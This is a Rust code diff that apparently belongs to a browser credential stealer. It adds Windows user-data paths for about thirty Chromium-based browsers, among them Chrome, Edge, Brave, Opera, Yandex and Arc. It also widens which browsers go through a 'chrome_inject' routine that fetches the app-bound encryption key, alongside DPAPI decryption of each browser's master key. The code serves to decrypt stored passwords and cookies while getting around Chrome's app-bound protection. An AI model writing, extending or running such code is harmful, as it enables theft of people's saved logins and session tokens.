@@ -18,23 +18,185 @@ struct MasterKeys {
 
 fn get_browsers() -> Vec<BrowserInfo> {
     let local = env::var("LOCALAPPDATA").unwrap_or_default();
+    let roaming = env::var("APPDATA").unwrap_or_default();
     vec![
+        // Google Chrome family
         BrowserInfo {
             name: "Chrome",
             user_data: PathBuf::from(&local).join("Google").join("Chrome").join("User Data"),
             has_profiles: true,
         },
         BrowserInfo {
-            name: "Brave",
-            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser").join("User Data"),
+            name: "Chrome Beta",
+            user_data: PathBuf::from(&local).join("Google").join("Chrome Beta").join("User Data"),
             has_profiles: true,
         },
+        BrowserInfo {
+            name: "Chrome Dev",
+            user_data: PathBuf::from(&local).join("Google").join("Chrome Dev").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Chrome Canary",
+            user_data: PathBuf::from(&local).join("Google").join("Chrome SxS").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Chromium",
+            user_data: PathBuf::from(&local).join("Chromium").join("User Data"),
+            has_profiles: true,
+        },
+        // Microsoft Edge
         BrowserInfo {
             name: "Edge",
             user_data: PathBuf::from(&local).join("Microsoft").join("Edge").join("User Data"),
             has_profiles: true,
         },
+        BrowserInfo {
+            name: "Edge Beta",
+            user_data: PathBuf::from(&local).join("Microsoft").join("Edge Beta").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Edge Dev",
+            user_data: PathBuf::from(&local).join("Microsoft").join("Edge Dev").join("User Data"),
+            has_profiles: true,
+        },
+        // Brave
+        BrowserInfo {
+            name: "Brave",
+            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Brave Beta",
+            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser-Beta").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Brave Nightly",
+            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser-Nightly").join("User Data"),
+            has_profiles: true,
+        },
+        // Opera (profile root = user data dir)
+        BrowserInfo {
+            name: "Opera",
+            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera Stable"),
+            has_profiles: false,
+        },
+        BrowserInfo {
+            name: "OperaGX",
+            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera GX Stable"),
+            has_profiles: false,
+        },
+        BrowserInfo {
+            name: "Opera Neon",
+            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera Neon").join("User Data"),
+            has_profiles: true,
+        },
+        // Others
+        BrowserInfo {
+            name: "Vivaldi",
+            user_data: PathBuf::from(&local).join("Vivaldi").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Yandex",
+            user_data: PathBuf::from(&local).join("Yandex").join("YandexBrowser").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "CocCoc",
+            user_data: PathBuf::from(&local).join("CocCoc").join("Browser").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "CentBrowser",
+            user_data: PathBuf::from(&local).join("CentBrowser").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "360Chrome",
+            user_data: PathBuf::from(&local).join("360Chrome").join("Chrome").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Epic Privacy Browser",
+            user_data: PathBuf::from(&local).join("Epic Privacy Browser").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Uran",
+            user_data: PathBuf::from(&local).join("uCozMedia").join("Uran").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "7Star",
+            user_data: PathBuf::from(&local).join("7Star").join("7Star").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Torch",
+            user_data: PathBuf::from(&local).join("Torch").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Kometa",
+            user_data: PathBuf::from(&local).join("Kometa").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Orbitum",
+            user_data: PathBuf::from(&local).join("Orbitum").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Amigo",
+            user_data: PathBuf::from(&local).join("Amigo").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Sputnik",
+            user_data: PathBuf::from(&local).join("Sputnik").join("Sputnik").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Slimjet",
+            user_data: PathBuf::from(&local).join("Slimjet").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Iridium",
+            user_data: PathBuf::from(&local).join("Iridium").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Thorium",
+            user_data: PathBuf::from(&local).join("Thorium").join("User Data"),
+            has_profiles: true,
+        },
+        BrowserInfo {
+            name: "Arc",
+            user_data: PathBuf::from(&local).join("The Browser Company").join("Arc").join("User Data"),
+            has_profiles: true,
+        },
     ]
+}
+
+fn supports_app_bound_injection(browser_name: &str) -> bool {
+    matches!(
+        browser_name,
+        "Chrome" | "Chrome Beta"
+            | "Chrome Dev"
+            | "Chrome Canary"
+            | "Chromium"
+            | "Brave"
+            | "Brave Beta"
+            | "Brave Nightly"
+            | "Edge"
+            | "Edge Beta"
+            | "Edge Dev"
+    )
 }
 
 fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
@@ -78,11 +240,8 @@ fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKe
     let standard = dpapi_decrypt(&decoded[5..], None, 0)?;
 
     let has_app_bound = json["os_crypt"]["app_bound_encrypted_key"].as_str().is_some();
-    let app_bound = if has_app_bound {
-        match browser_name {
-            "Chrome" | "Brave" | "Edge" => super::chrome_inject::fetch_app_bound_key(browser_name),
-            _ => None,
-        }
+    let app_bound = if has_app_bound && supports_app_bound_injection(browser_name) {
+        super::chrome_inject::fetch_app_bound_key(browser_name)
     } else {
         None
     };
